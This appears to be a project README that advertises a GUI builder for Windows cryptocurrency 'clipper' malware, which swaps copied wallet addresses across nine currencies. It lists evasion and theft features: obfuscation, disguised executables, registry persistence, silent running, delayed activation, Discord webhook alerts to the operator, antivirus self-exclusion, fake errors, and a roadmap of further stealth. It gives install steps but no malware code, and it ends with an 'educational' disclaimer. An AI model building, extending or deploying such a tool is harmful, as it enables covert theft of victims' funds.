# raccoon crypto clipper written in python

## **supports bitcoin, ethereum, litecoin, monero, solana, dogecoin, ripple, tron, bitcoin cash**

![Documentation](https://img.shields.io/badge/documentation-yes-brightgreen)
![Maintenance](https://img.shields.io/maintenance/yes/2025)
![GitHub issues](https://img.shields.io/github/issues/3022-2/raccoon_clipper)

## A GUI based builder for making custom crypto stealing malware
## GUI AND MALWARE DESIGNED FOR WINDOWS COMPUTERS - ANY OTHER SYSTEM WONT RUN
# video guide - click takes to youtube  
[![video link](https://img.youtube.com/vi/LCSdIR7-qqE/0.jpg)](https://youtu.be/LCSdIR7-qqE?si=NHwzbGYcxMrkz7wF)
# features
gui features
- written with [customtkinter](https://github.com/TomSchimansky/CustomTkinter), [CTkToolTip](https://github.com/Akascape/CTkToolTip) and [hPyT](https://github.com/Zingzy/hPyT)
- uses [pyarmor](https://github.com/dashingsoft/pyarmor) for obfuscating malware and [pyinstaller](https://github.com/pyinstaller/pyinstaller) for compiling to .exe
- allows setting custom icons to the malware .exe
- allows setting custom name for the malware .exe
- has documentation built into the GUI under the documentation tab

malware features
- supports Bitcoin, bitcoin cash, Ethereum, Litecoin, Monero, Solana, Dogecoin, Ripple, Tron at the same time
- six different types of the same malware but using different methods. subprocess, ctypes and pyperclip
    - tkinter uses the tkinter libary - fully python standard libary so no pip installs (is fastest + best on old/shit hardware)    
    - subprocess uses powershell commands to read and set clipboard - uses python standard libary so no need for the target to install anything
    - ctypes uses ctypes to read clipboard and powerhsell to set clipboard - uses python standard libary so no need for the target to install anything
    - pyperclip uses the pyperclip module to read and set clipboard - requires the target the run the command ```pip install pyperclip```
    - clipboard is literally a reskin of pyperclip - requires the target the run the command ```pip install clipboard```
    - win32clipboard uses the libary pywin32 - requires the target the run the command ```pip install pywin32```
- duplicates and adds itself to startup apps (registry) for persistence under a different name
- has single use method
- allows discord webhook (whenever a address is detected you get a discord notification which says the computer name and that the address has been changed), doesnt need any installs as uses http.client rather than requests to send POST requests to webhook 
- option to ping @everyone
- malware saved as .pyw and then compiled to .exe meaning that the malware runs in the background silently
- has a 4 restart incubate feature
- has a ignore feature (to not run on computers with a given computer name)

features i will want to add in the future
- [x] more supported crypto currencies 
- [x] get public ip and define method with webhook
- [ ] self check to avoid multiple instances 
- [ ] file extention spoofer
- [ ] file size pumper
- [x] base64 encodeding + exec 
- [ ] another obfuscation method and compile method to choose from
- [ ] duplicate file cleaner (when the persistent file is cteated remove its icon to make less obvious in startup apps)
- [x] self exclude from av (requires run from admin)
- [ ] anti virtual machine 
- [ ] process injection???? - maybe on this one, no idea how it works
- [x] exclude - (exclude specific computer names and so on)
- [x] incubate (only starts running after 4 restarts)
- [ ] second file persistence (if the first persistent file is removed successfully the second one will run - will be stored separately from main persistence files)
- [x] improve reset
- [x] add fake error
- [ ] add decoy programs
- [x] new error method to replace ctkmessagebox
# pictures
![image](https://github.com/user-attachments/assets/2113f236-8724-411a-846b-2436740d96df)  
![image](https://github.com/user-attachments/assets/09867fd6-f778-4ac0-a3f8-5627fd335466)  
![image](https://github.com/user-attachments/assets/8596316b-bc6f-4cd7-94bb-c38cc8034053)

if discord is being used  
![Screenshot 2024-06-03 233516](https://github.com/3022-2/crypto_clipper_builder/assets/82278708/b0111946-3bed-425c-a871-ebf63b9d33f1)
# installation
```bash
git clone https://github.com/3022-2/raccoon_clipper.git

cd raccoon_clipper

pip install -r requirements.txt

python main.pyw or double click main.pyw
```
# how to uninstall malware
1. kill the process in task manager and delete .exe
2. run uninstaller.py in uninstaller folder - if there is an error removing registry entry (cant find path) this is fine it means it isnt in startup anyway

you can also manual uninstall
1. kill the process in task manager and delete .exe
2. goto %appdata%
3. delete storage0 folder and CLPPTH folder
4. goto Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
5. delete entry named CLPPTH

# legal
DISCLAIMER: The code provided in this repository is intended for educational and malware analysis purposes only. Any use of this code for illegal or unethical activities is strictly prohibited. The author of this code shall not be held responsible for any misuse or damage resulting from its use. Users are solely responsible for ensuring compliance with applicable laws and ethical standards.  
  
WARNING: THIS IS MAKES MALWARE DESIGNED FOR STEALING CRYPTOCURRENCY. USE UNINSTALL GUIDE IF UNINSTALL CODE FAILS. (not found error doesn't necessarily mean didnt uninstall)

# contact
discord: hyperborean__  
